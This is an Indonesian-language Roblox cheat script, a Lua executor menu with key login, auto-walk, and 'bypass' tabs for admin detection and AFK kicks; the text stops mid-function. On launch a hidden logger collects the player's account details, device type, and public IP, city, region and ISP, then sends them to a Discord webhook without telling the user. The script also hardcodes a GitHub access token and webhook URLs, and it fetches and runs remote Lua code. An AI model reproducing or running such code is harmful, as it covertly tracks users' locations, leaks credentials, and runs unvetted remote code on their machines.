--[[
    ================================================================
    MarV In Your Area | AUTO WALK
    Author: MarV
    Discord: https://marvscript.my.id
    ================================================================
]]

-- Reset setup guards setiap kali script dijalankan ulang
-- (agar tab tidak kosong saat executor re-run)
do
    local guards = {
        "_SETUP_DONE_setupAccountTab","_SETUP_DONE_setupCreditsTab",
        "_SETUP_DONE_setupBypassTab","_SETUP_DONE_setupListScript",
        "_SETUP_DONE_setupAutowalkTab","_SETUP_DONE_setupRecordTab","_SETUP_DONE_setupCopyavatarTab",
        "_SETUP_DONE_setupCustomanimationTab","_SETUP_DONE_setupSkyboxTab",
        "_SETUP_DONE_setupPlayermenuTab","_SETUP_DONE_setupSocialTab",
        "_SETUP_DONE_setupAppearanceTab","_SETUP_DONE_setupUpdatecheckpointTab",
        "_SETUP_DONE_setupUploadTab","_SETUP_DONE_setupWebhookTab","_SETUP_DONE_setupLogoutTab","_SETUP_DONE_setupCustomNameTab",
        "_WL_ENTRY","UserToken","AuthComplete","AuthTimestamp",
    }
    for _, k in ipairs(guards) do getgenv()[k] = nil end
    -- Reset menuCreated di getgenv juga
    getgenv()._menuCreated = nil
end

-- Load Library WindUI
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- Create Window
local Window = WindUI:CreateWindow({
    Title = "Pokay X Marv | Jepin",
    Icon = "rbxassetid://86851057077349",
    Author = "JepinGacor",
    Size = UDim2.fromOffset(700, 600),
    Transparent = true,
    Theme = "Sky",
    Resizable = true,
    SideBarWidth = 180,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = false,
    Background = "rbxassetid://86851057077349",
    
    User = {
        Enabled = true,
        Anonymous = true,
        Callback = function()
            -- Nothing
        end,
    },
})

-- Background Image Settings
Window:SetBackgroundImage("rbxassetid://86851057077349")
Window:SetBackgroundImageTransparency(0.9)

-- Open Menu Button
Window:EditOpenButton({
    Title = "JEPIN GANTENG",
    Icon = "monitor",
    CornerRadius = UDim.new(0, 16),
    StrokeThickness = 2,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromHex("FF0F7B")),
        ColorSequenceKeypoint.new(1, Color3.fromHex("F89B29"))
    }),
    StrokeColor = Color3.fromRGB(255, 255, 255),
    StrokeTransparency = 0.2,
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
    Shadow = true,
    ShadowTransparency = 0.35,
    ShadowColor = Color3.fromRGB(20, 20, 20),
})

-- Keybinds
Window:SetToggleKey(Enum.KeyCode.M)

--| =========================================================== |--
--| SERVICES & IMPORTS                                          |--
--| =========================================================== |--

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local PlayersService = game:GetService("Players")

local LP = Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer
local RobloxUsername = LocalPlayer.Name
local LocalPlayer = PlayersService.LocalPlayer

--| =========================================================== |--
--| EXECUTE LOGGER                                              |--
--| =========================================================== |--
task.spawn(function()
    pcall(function()
        -- Ambil info dasar
        local userId      = tostring(LP.UserId)
        local displayName = tostring(LP.DisplayName)
        local username    = tostring(LP.Name)

        -- Hitung umur akun
        local accAge     = ""
        local accCreated = ""
        pcall(function()
            local info = Players:GetPlayerInfoByIdAsync(LP.UserId)
            if info then
                local created = info.MembershipType ~= nil and tostring(info.Created) or ""
                accCreated = created
            end
        end)

        -- Premium status
        local isPremium = LP.MembershipType == Enum.MembershipType.Premium
        local premiumStr = isPremium and "Premium" or "Non-Premium"

        -- Device type
        local deviceType = "Unknown"
        pcall(function()
            local UIS = game:GetService("UserInputService")
            if UIS.TouchEnabled and not UIS.KeyboardEnabled then
                deviceType = "Mobile"
            elseif UIS.KeyboardEnabled then
                deviceType = "PC"
            end
        end)

        -- IP via api.roblox.com proxy (executor)
        local ipAddr = "N/A"
        local ipCountry = "N/A"
        local ipRegion  = "N/A"
        local ipCity    = "N/A"
        local ipIsp     = "N/A"
        local httpFunc =
            (typeof(request)       == "function" and request)          or
            (typeof(http_request)  == "function" and http_request)     or
            (syn    and typeof(syn.request)      == "function" and syn.request)    or
            (http   and typeof(http.request)     == "function" and http.request)   or
            (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
            nil
        pcall(function()
            local res
            if httpFunc then
                res = httpFunc({Url="http://ip-api.com/json/", Method="GET"})
                if res and (res.Body or res.body) then
                    local d = HttpService:JSONDecode(res.Body or res.body)
                    if d then
                        ipAddr    = tostring(d.query      or "N/A")
                        ipCountry = tostring(d.country    or "N/A")
                        ipRegion  = tostring(d.regionName or "N/A")
                        ipCity    = tostring(d.city       or "N/A")
                        ipIsp     = tostring(d.isp        or "N/A")
                    end
                end
            end
        end)

        -- Game info
        local gameName = tostring(game.PlaceId)
        pcall(function()
            local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            if info then gameName = info.Name end
        end)
        local placeId  = tostring(game.PlaceId)
        local jobId    = tostring(game.JobId)
        local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
        local gameLink    = "https://www.roblox.com/games/" .. placeId

        -- Thumbnail
        local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

        -- Timestamp
        local dt  = os.date("*t")
        local tgl = string.format("%02d/%02d/%04d %02d:%02d", dt.day, dt.month, dt.year, dt.hour, dt.min)

        -- Build embed
        local userInfo    = "**User:** " .. username .. " (`" .. userId .. "`)" ..
                            "\n**Display:** " .. displayName ..
                            "\n**Premium:** " .. premiumStr .. "  |  **Device:** " .. deviceType
        local netInfo     = "**IP:** `" .. ipAddr .. "`" ..
                            "\n**Lokasi:** " .. ipCity .. ", " .. ipRegion .. ", " .. ipCountry ..
                            "\n**ISP:** " .. ipIsp
        local gameInfo    = "**Game:** " .. gameName ..
                            "\n**Place ID:** `" .. placeId .. "`" ..
                            "\n**Job ID:** `" .. jobId .. "`"
        local linksInfo   = "[Profile](https://www.roblox.com/users/" .. userId .. "/profile)  |  " ..
                            "[Game](https://www.roblox.com/games/" .. placeId .. ")"
        local body = HttpService:JSONEncode({
            embeds = {{
                title       = "Script Executed!",
                description = "**" .. displayName .. "** has executed the script",
                color       = 0xE53935,
                thumbnail   = {url = thumbUrl},
                image       = {url = thumbUrl},
                fields      = {
                    {name="👤 User Info",        value=userInfo,  inline=false},
                    {name="🌐 Network Info",     value=netInfo,   inline=false},
                    {name="🎮 Game Info",        value=gameInfo,  inline=false},
                    {name="🔗 Quick Links",      value=linksInfo, inline=false},
                },
                footer = {text = "PokayCore Logger  |  " .. tgl},
            }}
        })

        local spyUrl = "https://discord.com/api/webhooks/1482408667105202309/MWb6h4rqLdiOMq6Z9qMVzAyI92q3q1qwq4xXXldc2bQzitJ8lrIdWsOtkczPwICegiSc"
        local headers = {["Content-Type"]="application/json", ["User-Agent"]="RobloxScript"}
        local httpFunc2 =
            (typeof(request)       == "function" and request)          or
            (typeof(http_request)  == "function" and http_request)     or
            (syn    and typeof(syn.request)      == "function" and syn.request)    or
            (http   and typeof(http.request)     == "function" and http.request)   or
            (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
            nil
        if httpFunc2 then
            httpFunc2({Url=spyUrl, Method="POST", Headers=headers, Body=body})
        else
            pcall(function() HttpService:RequestAsync({Url=spyUrl, Method="POST", Headers=headers, Body=body}) end)
        end
    end)
end)

--| =========================================================== |--
--| TAB DECLARATIONS                                            |--
--| =========================================================== |--

-- Tab Auth
local AuthTab = Window:Tab({
    Title = "Authentication",
    Icon = "key",
})

Window:Divider()

AuthTab:Select()

-- Other Tabs
local AccountTab = nil
local CreditsTab = nil
local BypassTab = nil
local ListScript = nil
local AutowalkTab = nil
local RecordTab = nil
local UploadTab = nil
local WebhookTab = nil
local CopyavatarTab = nil
local CustomanimationTab = nil
local SkyboxTab = nil
local PlayermenuTab = nil
local SocialTab = nil
local AppearanceTab = nil
local UpdatecheckpointTab = nil
local LogoutTab = nil
local CustomNameTab = nil

-- Global Webhook State
getgenv()._MarvWebhookURL     = getgenv()._MarvWebhookURL or ""
getgenv()._MarvSummitCount    = getgenv()._MarvSummitCount or 0
getgenv()._MarvWebhookEnabled = getgenv()._MarvWebhookEnabled or false

--| =========================================================== |--
--| CONFIGURATION & VARIABLES                                   |--
--| =========================================================== |--

-- File Config for Token Storage
local FILE_CONFIG = {
    folder = "POKAYSCRIPT",
    subfolder = "auth",
    filename = "token.dat"
}

-- GitHub Configuration (sinkron Dashboard PokayCore)
local GH_TOKEN        = "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"
local GH_USER         = "heimalingpangsit"
local GH_REPO         = "GATAU"
local GH_FOLDER_PUB   = "wiwokdetok"   -- PUBLIC (owner/admin)
local GH_FOLDER_DON   = "donatur"      -- DONATUR
local GH_FOLDER_PRIV  = "private"      -- PRIVATE (freeuser)
local GH_WL_FOLDER    = "wl"
local GH_WL_FILE      = "p"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1444181677776703599/PuGIc7X3DvVDqFW9fFCTI1Yj46Tp6b8ZKZfDnVH2ycaX6EG2gPCEO11Dybn3Nqiz2UzR"

-- Owner & Admin (hardcoded fallback)
local OWNER_NAMES = { ["hasimkipui"] = true }
local ADMIN_NAMES = { ["jrkigacor420"] = true, ["tes123"] = true }

-- Global Variables
local enteredKey = ""
local menuCreated = false
local isAuthenticating = false
local currentRole = "freeuser"

-- Role helpers
local function isOwner()       return OWNER_NAMES[RobloxUsername] == true end
local function isAdmin()       return ADMIN_NAMES[RobloxUsername] == true end
local function isOwnerOrAdmin() return isOwner() or isAdmin() end
local function isDonatur()     return currentRole == "donatur" end
local function getRoleLabel()
    if isOwner()  then return "👑 Owner"
    elseif isAdmin() then return "🛡 Admin"
    elseif isDonatur() then return "⭐ Donatur"
    else return "👤 Freeuser" end
end

-- Account Data Storage
local AccountData = {
    DisplayName = "",
    Username = "",
    Token = "",
    Role = "",
    ExpireDate = "",
    ExpireDays = 0,
    CreatedAt = "",
    WhitelistStatus = "",
    LastUpdated = 0
}

--| =========================================================== |--
--| UTILITY FUNCTIONS                                           |--
--| =========================================================== |--

-- Get Auth File Path
local function getAuthFilePath()
    return FILE_CONFIG.folder .. "/" .. FILE_CONFIG.subfolder .. "/" .. FILE_CONFIG.filename
end

-- Save Token
local function saveToken(token)
    local success, err = pcall(function()
        if not isfolder(FILE_CONFIG.folder) then
            makefolder(FILE_CONFIG.folder)
        end
        
        local authFolder = FILE_CONFIG.folder .. "/" .. FILE_CONFIG.subfolder
        if not isfolder(authFolder) then
            makefolder(authFolder)
        end
        
        local data = {
            token = token,
            username = RobloxUsername,
            saved_at = os.time(),
            version = "1.0"
        }
        
        writefile(getAuthFilePath(), HttpService:JSONEncode(data))
    end)
    
    if not success then
        warn("[AUTH] Gagal menyimpan token: " .. tostring(err))
    end
    
    return success
end

-- Load Token
local function loadToken()
    local success, result = pcall(function()
        if not isfile(getAuthFilePath()) then
            return nil
        end
        
        local content = readfile(getAuthFilePath())
        local data = HttpService:JSONDecode(content)
        
        if data.username == RobloxUsername then
            return data.token
        else
            return nil
        end
    end)
    
    if success then
        return result
    else
        warn("[AUTH] Failed to load token: " .. tostring(result))
        return nil
    end
end

-- Delete Token
local function deleteToken()
    pcall(function()
        if isfile(getAuthFilePath()) then
            delfile(getAuthFilePath())
        end
    end)
end

-- Safe HTTP Request
-- Kompatibel: Xeno, Solara, Delta, Fluxus, Synapse, Mobile executor
local function safeHttpRequest(url, method, data, headers)
    method = method or "GET"
    if not headers then headers = {} end
    headers["ngrok-skip-browser-warning"] = "true"

    local requestData = {
        Url     = url,
        Method  = method,
        Headers = headers,
    }
    if data and (method == "POST" or method == "PUT" or method == "PATCH") then
        requestData.Body = data
    end

    -- Deteksi httpFunc: Xeno/Solara pakai request/http_request
    local httpFunc =
        (typeof(request)       == "function" and request)          or
        (typeof(http_request)  == "function" and http_request)     or
        (syn    and typeof(syn.request)      == "function" and syn.request)    or
        (http   and typeof(http.request)     == "function" and http.request)   or
        (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
        nil

    -- 1. Executor HTTP function (paling kompatibel, support custom headers)
    if httpFunc then
        local ok, res = pcall(httpFunc, requestData)
        if ok and res then
            local code = res.StatusCode or res.status_code or 0
            local body = res.Body or res.body or ""
            if code >= 200 and code < 300 then
                return true, body
            elseif method ~= "GET" then
                return false, "HTTP " .. code .. ": " .. tostring(body)
            end
        end
    end

    -- 2. Fallback: HttpService:RequestAsync
    local ok2, res2 = pcall(function()
        return HttpService:RequestAsync(requestData)
    end)
    if ok2 and res2 then
        local code = res2.StatusCode or 0
        local body = res2.Body or ""
        if res2.Success or (code >= 200 and code < 300) then
            return true, body
        elseif method ~= "GET" then
            return false, "HTTP " .. code .. ": " .. tostring(body)
        end
    end

    -- 3. Fallback GET-only: GetAsync
    if method == "GET" then
        local ok3, res3 = pcall(function() return HttpService:GetAsync(url, true) end)
        if ok3 and res3 and res3 ~= "" then return true, res3 end

        local ok4, res4 = pcall(function() return game:HttpGet(url) end)
        if ok4 and res4 and res4 ~= "" then return true, res4 end
    end

    return false, "Semua metode HTTP gagal. Pastikan executor support HTTP requests."
end

-- Format Date to Indonesian
local function formatDateIndonesia(dateString)
    if not dateString or dateString == "" then
        return "N/A"
    end
    
    local monthNames = {
        "Januari", "Februari", "Maret", "April", "Mei", "Juni",
        "Juli", "Agustus", "September", "Oktober", "November", "Desember"
    }
    
    local pattern = "(%d+)-(%d+)-(%d+) (%d+):(%d+):(%d+)"
    local year, month, day, hour, min, sec = dateString:match(pattern)
    
    if year and month and day then
        local monthNum = tonumber(month)
        local monthName = monthNames[monthNum] or "Unknown"
        return string.format("%02d %s %s", tonumber(day), monthName, year)
    end
    
    return dateString
end

-- Mask Token
local function maskToken(token)
    if not token or token == "" then
        return "N/A"
    end
    
    local len = #token
    if len <= 8 then
        return string.rep("*", len)
    end
    
    local start = token:sub(1, 4)
    local end_part = token:sub(-4)
    local middle = string.rep("*", len - 8)
    
    return start .. middle .. end_part
end

-- Format Expire Days
local function formatExpireDays(days)
    if days <= 0 then
        return "Expired"
    elseif days == 1 then
        return "1 Day"
    else
        return days .. " Days"
    end
end

-- Update Account Data
local function updateAccountData(userData)
    if type(userData) == "table" then
        AccountData.DisplayName = LocalPlayer.DisplayName or LocalPlayer.Name
        AccountData.Username = userData.name or RobloxUsername
        AccountData.Token = getgenv().UserToken or ""
        AccountData.Role = userData.role or "freeuser"
        AccountData.ExpireDate = userData.expire_date or ""
        AccountData.ExpireDays = userData.expire_days or 0
        AccountData.CreatedAt = userData.created_at or ""
        AccountData.WhitelistStatus = userData.whitelist_status or "unknown"
        AccountData.LastUpdated = os.time()
        -- Sync currentRole
        local r = tostring(userData.role or "freeuser"):lower()
        if OWNER_NAMES[RobloxUsername] then currentRole = "owner"
        elseif ADMIN_NAMES[RobloxUsername] then currentRole = "admin"
        else currentRole = r end
    end
end

--| =========================================================== |--
--| API FUNCTIONS                                               |--
--| =========================================================== |--

-- Validate Token (via GitHub whitelist wl/p)
local function ValidateToken(token)
    if not token or token == "" then return false, "Token tidak boleh kosong!" end
    local trimmed = token:gsub("%s+",""):gsub("[\n\r\t]","")

    local apiUrl = "https://api.github.com/repos/" .. GH_USER .. "/" .. GH_REPO
                 .. "/contents/" .. GH_WL_FOLDER .. "/" .. GH_WL_FILE
    local ok, res = safeHttpRequest(apiUrl, "GET", nil, {
        ["Authorization"] = "token " .. GH_TOKEN,
        ["Accept"]        = "application/vnd.github.v3+json",
        ["User-Agent"]    = "RobloxScript",
    })
    if not ok then return false, "Gagal ambil whitelist: " .. tostring(res) end

    local okDec, ghData = pcall(function() return HttpService:JSONDecode(res) end)
    if not okDec or type(ghData) ~= "table" then return false, "Gagal parse whitelist" end

    local b64 = (ghData.content or ""):gsub("\n",""):gsub("\r",""):gsub(" ","")
    if b64 == "" then return false, "Whitelist kosong!" end

    local rawJson = ""
    local okB, bRes = pcall(function()
        return game:HttpGet("https://api.allorigins.win/raw?url="
            .. HttpService:UrlEncode("data:text/plain;base64," .. b64))
    end)
    if okB and bRes and #bRes > 2 then
        rawJson = bRes
    else
        local okDl, dlRes = pcall(function() return game:HttpGet(ghData.download_url or "") end)
        if okDl and dlRes then rawJson = dlRes
        else return false, "Gagal decode whitelist" end
    end

    local okP, entries = pcall(function() return HttpService:JSONDecode(rawJson) end)
    if not okP or type(entries) ~= "table" then return false, "Format whitelist tidak valid" end

    local found = nil
    for _, e in ipairs(entries) do
        if type(e) == "table" then
            local eKey  = tostring(e.key or ""):gsub("%s+","")
            local eUser = tostring(e.username or ""):lower()
            if eKey == trimmed and eUser == RobloxUsername:lower() then found = e; break end
        end
    end
    if not found then
        for _, e in ipairs(entries) do
            if type(e) == "table" and tostring(e.key or ""):gsub("%s+","") == trimmed then
                return false, "Key valid tapi bukan milik akun ini!"
            end
        end
        return false, "Key tidak ditemukan!"
    end

    local expires = tostring(found.expires or "permanent"):lower()
    if expires ~= "permanent" and expires ~= "" then
        local y,m,d = expires:match("(%d+)-(%d+)-(%d+)")
        if y then
            local expTime = os.time({year=tonumber(y),month=tonumber(m),day=tonumber(d),hour=23,min=59,sec=59})
            if os.time() > expTime then return false, "Key expired: " .. expires end
        end
    end

    -- Set role
    local role = tostring(found.role or "freeuser"):lower()
    currentRole = role
    if OWNER_NAMES[RobloxUsername] then currentRole = "owner" end
    if ADMIN_NAMES[RobloxUsername] then currentRole = "admin" end

    getgenv()._WL_ENTRY = found
    return true, found
end

-- Get User Info (dari cached WL entry)
local function GetUserInfo(token)
    if not token or token == "" then return false, "Token tidak boleh kosong!" end
    local entry = getgenv()._WL_ENTRY
    if not entry then return false, "Data user tidak ditemukan" end

    local expires  = tostring(entry.expires or "permanent"):lower()
    local expDays, expDate = 99999, "Permanent"
    if expires ~= "permanent" and expires ~= "" then
        local y,m,d = expires:match("(%d+)-(%d+)-(%d+)")
        if y then
            local expTime = os.time({year=tonumber(y),month=tonumber(m),day=tonumber(d),hour=23,min=59,sec=59})
            expDays  = math.max(0, math.ceil((expTime - os.time()) / 86400))
            expDate  = expires
        end
    end

    local role = tostring(entry.role or "freeuser"):lower()
    if OWNER_NAMES[RobloxUsername] then role = "owner" end
    if ADMIN_NAMES[RobloxUsername] then role = "admin" end

    return true, {
        status           = "success",
        name             = tostring(entry.username or RobloxUsername),
        role             = role,
        expire_date      = expDate,
        expire_days      = expDays,
        created_at       = tostring(entry.added or ""),
        whitelist_status = "active",
    }
end

--| =========================================================== |--
--| TAB CREATION FUNCTION                                       |--
--| =========================================================== |--

local function createAndUnlockAllTabs()
    -- Create Account Tab
    if not AccountTab then
        AccountTab = Window:Tab({
            Title = "Account",
            Icon = "user",
        })
    end

	-- Create Credits Tab
    if not CreditsTab then
        CreditsTab = Window:Tab({
            Title = "Credits",
            Icon = "copyright",
        })
    end

    -- Create Bypass Tab 
    if not BypassTab then
        BypassTab = Window:Tab({
            Title = "Bypass",
            Icon = "shield",
        })
    end
    
    -- Create Script List Tab 
    if not ListScript then
        ListScript = Window:Tab({
            Title = "Main Script",
            Icon = "bot",
        })
    end
    
    -- Create Autowalk Tab 
    if not AutowalkTab then
        AutowalkTab = Window:Tab({
            Title = "Auto Walk",
            Icon = "bot",
        })
    end

    -- Create Upload Tab (tepat setelah Auto Walk)
    if not RecordTab then
        RecordTab = Window:Tab({
            Title = "🎬 Record",
            Icon = "video",
        })
    end

    -- Create Upload Tab (tepat setelah Auto Walk)
    if not UploadTab then
        UploadTab = Window:Tab({
            Title = "☁️ Upload",
            Icon = "upload-cloud",
        })
    end

    -- Create Webhook Tab
    if not WebhookTab then
        WebhookTab = Window:Tab({
            Title = "Webhook",
            Icon = "webhook",
        })
    end

    -- Create Copy Avatar Tab
    if not CopyavatarTab then
        CopyavatarTab = Window:Tab({
            Title = "Copy Avatar",
            Icon = "sparkles",
        })
    end

	-- Create Custom Animation Tab
    if not CustomanimationTab then
        CustomanimationTab = Window:Tab({
            Title = "Animation",
            Icon = "person-standing",
        })
    end

	-- Create Skybox Tab
    if not SkyboxTab then
        SkyboxTab = Window:Tab({
            Title = "Skybox",
            Icon = "cloud-sun",
        })
    end


	-- Create Player Menu Tab
    if not PlayermenuTab then
        PlayermenuTab = Window:Tab({
            Title = "Player Menu",
            Icon = "user-cog",
        })
    end

	-- Create Social Media Tab
    if not SocialTab then
        SocialTab = Window:Tab({
            Title = "Social Media",
            Icon = "link",
        })
    end

    -- Create Appearance Tab
    if not AppearanceTab then
        AppearanceTab = Window:Tab({
            Title = "Themes UI",
            Icon = "palette",
        })
    end

	-- Create Appearance Tab
    if not UpdatecheckpointTab then
        UpdatecheckpointTab = Window:Tab({
            Title = "Update Checkpoint",
            Icon = "file",
        })
    end

	-- Create Logout Tab
    if not LogoutTab then
        LogoutTab = Window:Tab({
            Title = "Logout",
            Icon = "log-out",
        })
    end

    -- Create Custom Name Tab
    if not CustomNameTab then
        CustomNameTab = Window:Tab({
            Title = "Custom Name",
            Icon  = "pencil",
        })
    end
end

--| =========================================================== |--
--| AUTH TAB UI                                                 |--
--| =========================================================== |--


AuthTab:Paragraph({
    Title = "Information",
    Desc = "Untuk mengakses kamu membutuhkan key, silakan masukkan key/token yang telah anda dapat dari bot. Jika Anda belum memiliki key/token, Anda dapat mengambilnya terlebih dahulu melalui server Discord kami: https://discord.gg/tXRmdCsSEn",
})

AuthTab:Divider()

AuthTab:Input({
    Title = "[◉] Input Key",
    Type = "Input",
    InputIcon = "key",
    Placeholder = "Masukan key",
    Callback = function(input) 
        enteredKey = tostring(input or ""):gsub("%s+", ""):gsub("[\n\r\t]", "")
    end
})

--| =========================================================== |--
--| MASKING FUNCTIONS                                           |--
--| =========================================================== |--

-- Masking DisplayName & Username (3 awal, bintang, 2 akhir)
local function maskName(name)
    if not name or name == "" then
        return "*****"
    end

    local len = #name

    -- Jika kependekan, mask sebagian
    if len <= 5 then
        return string.sub(name, 1, 1) .. string.rep("*", len - 1)
    end

    local first3 = string.sub(name, 1, 2)
    local last2 = string.sub(name, len - 1, len)
    local middle = string.rep("*", len - 5)

    return first3 .. middle .. last2
end

-- Masking Token (5 awal + bintang + 3 akhir)
local function maskToken(token)
    if not token or token == "" then
        return "********"
    end

    local len = #token
    if len <= 8 then
        return string.rep("*", len)
    end

    local first5 = string.sub(token, 1, 5)
    local last3 = string.sub(token, len - 2, len)
    local middle = string.rep("*", len - 8)

    return first5 .. middle .. last3
end

--| =========================================================== |--
--| ACCOUNT TAB SETUP                                           |--
--| =========================================================== |--

local accountInfoParagraph = nil

local function refreshAccountDisplay()
    if not AccountTab then return "" end
    
    -- Raw
    local rawDisplayName = AccountData.DisplayName ~= "" and AccountData.DisplayName or "Loading..."
    local rawUsername = AccountData.Username ~= "" and AccountData.Username or RobloxUsername

    -- Masked
    local displayName = maskName(rawDisplayName)
    local username = maskName(rawUsername)
    local token = maskToken(AccountData.Token)

    -- Existing logic
    local role = AccountData.Role ~= "" and AccountData.Role or "Member"
    local expireDays = AccountData.ExpireDays
    local expireDaysFormatted = formatExpireDays(expireDays)
    local createdAt = formatDateIndonesia(AccountData.CreatedAt)
    local statusText = expireDays > 0 and "Active" or "Expired"
    
    -- Output string
    local description = string.format(
        "[◉] Display Name: %s\n[◉] Username: %s\n[◉] Role: %s\n[◉] Token: %s\n[◉] VIP Member: %s\n[◉] Expire: %s\n[◉] Status: %s",
        displayName,
        username,
        role,
        token,
        createdAt,
        expireDaysFormatted,
        statusText
    )
    
    return description
end

local function setupAccountTab()
    if not AccountTab then return end
    if getgenv()["_SETUP_DONE_setupAccountTab"] then return end
    getgenv()["_SETUP_DONE_setupAccountTab"] = true
    

    local currentToken = getgenv().UserToken or loadToken()
    if currentToken then
        local success, userData = GetUserInfo(currentToken)
        if success then
            updateAccountData(userData)
        end
    end

    local initialDesc = refreshAccountDisplay()

    accountInfoParagraph = AccountTab:Paragraph({
        Title = "-| Information Account |-",
        Desc = initialDesc,
    })

    AccountTab:Divider()

    AccountTab:Button({
        Title = "[◉] Refresh Account Info",
        Icon = "refresh-ccw",
        Callback = function()
            WindUI:Notify({
                Title = "Refreshing...",
                Content = "Memperbarui data akun...",
                Duration = 2,
                Icon = "loader",
            })
            
            local currentToken = getgenv().UserToken or loadToken()
            
            if not currentToken or currentToken == "" then
                WindUI:Notify({
                    Title = "Error",
                    Content = "Token tidak ditemukan. Silakan login ulang.",
                    Duration = 3,
                    Icon = "triangle-alert",
                })
                return
            end
            
            local success, userData = GetUserInfo(currentToken)
            
            if success then
                updateAccountData(userData)
                
                local newDesc = refreshAccountDisplay()
                if accountInfoParagraph and accountInfoParagraph.SetDesc then
                    accountInfoParagraph:SetDesc(newDesc)
                end
                
                WindUI:Notify({
                    Title = "Success!",
                    Content = "Data account berhasil diperbarui!",
                    Duration = 4,
                    Icon = "check-check",
                })
            else
                WindUI:Notify({
                    Title = "Error",
                    Content = tostring(userData),
                    Duration = 4,
                    Icon = "x-circle",
                })
            end
        end
    })

    AccountTab:Divider()
end

--| =========================================================== |--
--| CREDITS TAB                                                 |--
--| =========================================================== |--

local function setupCreditsTab()
    if getgenv()["_SETUP_DONE_setupCreditsTab"] then return end
    getgenv()["_SETUP_DONE_setupCreditsTab"] = true

    CreditsTab:Button({
        Title    = "Join Discord Community",
        Desc     = "Click to copy invite link",
        Icon     = "link",
        Callback = function()
            pcall(function() setclipboard("https://discord.gg/tXRmdCsSEn") end)
            WindUI:Notify({Title="Discord", Content="Invite link berhasil dicopy!", Duration=3, Icon="copy"})
        end
    })

    CreditsTab:Divider()

    CreditsTab:Section({
        Title = "Our Beloved Team",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    CreditsTab:Paragraph({
        Title = "Official Pokay Team",
        Desc  = "◆ @Jepin  - Owner\n"
              .."◆ @rebelsxzz & itsmarv.  - 2nd Owner | Bug Fixxing\n"
              .."◆ @miksutrg  - Community Handler\n"
              .."◆ @tirtawho - Whitelist Handler\n"
              .."◆ @tirtawho - Map Handler\n"
              .."◆ @yeyejii & @anata_seiyu - Social Media Handler",
    })

    CreditsTab:Divider()

    CreditsTab:Section({
        Title = "Special Thanks To",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    CreditsTab:Paragraph({
        Title = "Resources & Inspirations",
        Desc  = "• Script Development: Rex Rebels\n"
              .."• Copy Avatar System: MarV Team\n"
              .."• Skybox Assets: Rex Rebels\n"
              .."• Emotes Menu: Vexro Emotes\n"
              .."• UI Library: WindUI (by FootageSUS)",
    })

    CreditsTab:Divider()

end
--| =========================================================== |--
--| BYPASS TAB SETUP                                            |--
--| =========================================================== |--

local function setupBypassTab()
    if not BypassTab then return end
    if getgenv()["_SETUP_DONE_setupBypassTab"] then return end
    getgenv()["_SETUP_DONE_setupBypassTab"] = true 

    -- UI Section

	BypassTab:Paragraph({
        Title = "Bypass Afk Tidak Berfungsi?",
        Desc = "Jika fitur bypass afk di bawah tidak berfungsi silahkan pake auto clicker di bawah ini, untuk cara menggunakan auto clicker tutorial nya banyak dari youtube silahkan di tonton saja.",
    })

    BypassTab:Divider()

	BypassTab:Toggle({
        Title = "Bypass Admin Detection",
        Desc = "Berfungsi jika admin masuk ke dalam server, maka kamu secara otomatis disconect dari server.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            if state then
                do
                    local _ok, _err = pcall(function() loadstring(game:HttpGet("https://rullzsyhub.web.id/lua/rullzsyhub_admin_detection.lua"))() end)
                    if not _ok then
                        WindUI:Notify({Title="❌ Script Error", Content="admin_detection.lua\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                    end
                end
				WindUI:Notify({
                	Title = "Bypass Admin Detection",
                	Content = "Telah diaktifkan!",
                	Duration = 3,
                	Icon = "shield",
            	})
            else
                -- Nothing
            end
        end,
    })

	BypassTab:Toggle({
        Title = "Bypass AFK",
        Desc = "Berfungsi untuk afk push summit biar tidak terkena kick oleh bot idle 20 menit.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            if state then
                do
                    local _ok, _err = pcall(function() loadstring(game:HttpGet("https://rullzsyhub.web.id/lua/rullzsyhub_bypass_afk.lua"))() end)
                    if not _ok then
                        WindUI:Notify({Title="❌ Script Error", Content="bypass_afk.lua\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                    end
                end
				WindUI:Notify({
                	Title = "Bypass AFK",
                	Content = "Telah diaktifkan!",
                	Duration = 3,
                	Icon = "shield",
            	})
            else
                -- Nothing
            end
        end,
    })

    BypassTab:Divider()

    BypassTab:Button({
        Title = "[◉] AUTO CLICKER | PC",
        Icon = "download",
        Callback = function()
            local ac_link_pc = "https://www.mediafire.com/file/z2u53gx0xzafzl6/OP_Auto_Clicker.zip/file"

            if setclipboard then
                setclipboard(ac_link_pc)
            elseif toclipboard then
                toclipboard(ac_link_pc)
            end
            WindUI:Notify({
                Title = "Auto Clicker",
                Content = "Link download auto clicker telah di salin!",
                Duration = 3,
                Icon = "clipboard",
            })
        end
    })

    BypassTab:Button({
        Title = "[◉] AUTO CLICKER | ANDROID",
        Icon = "download",
        Callback = function()
            local ac_link_android = "https://www.mediafire.com/file/e0rln9i2pypuyod/Auto_Clicker_-_Automatic_tap.apk/file"

            if setclipboard then
                setclipboard(ac_link_android)
            elseif toclipboard then
                toclipboard(ac_link_android)
            end
            WindUI:Notify({
                Title = "Auto Clicker",
                Content = "Link download auto clicker telah di salin!",
                Duration = 3,
                Icon = "clipboard",
            })
        end
    })

    BypassTab:Divider()
end

--| =========================================================== |--
--| AUTOWALK TAB SETUP                                          |--
--| =========================================================== |--

local function setupAutowalkTab()
    if not AutowalkTab then return end
